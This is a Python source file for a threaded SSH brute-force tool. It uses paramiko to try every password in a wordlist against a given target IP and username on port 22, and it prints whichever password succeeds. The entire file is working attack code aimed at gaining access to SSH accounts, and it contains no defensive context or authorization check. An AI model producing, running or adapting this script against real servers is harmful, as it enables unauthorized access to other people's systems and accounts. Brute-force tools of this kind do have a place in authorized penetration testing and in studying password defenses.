import paramiko
import sys
import os
import argparse
import concurrent.futures
import threading

# Global flag to stop threads when password is found
found_event = threading.Event()

def ssh_connect(target, username, password):
    if found_event.is_set():
        return

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(target, port=22, username=username, password=password, timeout=3)
        # If we reach here, connection was successful
        print(f'\n[+] Password Found: {password}')
        found_event.set()
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        # Authentication failed
        pass
    except Exception as e:
        # Connection error or other issues
        pass
    finally:
        ssh.close()
    return False

def main():
    parser = argparse.ArgumentParser(description='Threaded SSH Brute Force Tool')
    parser.add_argument('target', help='Target IP Address')
    parser.add_argument('username', help='Username to bruteforce')
    parser.add_argument('wordlist', help='Path to password wordlist')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads (default: 5)')

    args = parser.parse_args()

    if not os.path.exists(args.wordlist):
        print(f'\n[!] Wordlist file not found: {args.wordlist}')
        sys.exit(1)

    print(f'\n[*] Starting Threaded SSH Brute Force on {args.target} for user {args.username}')
    print(f'[*] Using {args.threads} threads...')

    passwords = []
    try:
        with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f'[!] Error reading wordlist: {e}')
        sys.exit(1)

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        # Create a dictionary to map futures to passwords if needed, or just submit
        futures = []
        for password in passwords:
            if found_event.is_set():
                break
            futures.append(executor.submit(ssh_connect, args.target, args.username, password))
            
        # Optional: Wait for "found" or completion
        # We can't easily kill other threads in ThreadPoolExecutor, but the `found_event` check
        # at the start of `ssh_connect` will prevent new attempts.
        
    if not found_event.is_set():
        print('\n[!] Password not found in the provided wordlist.')

if __name__ == '__main__':
    main()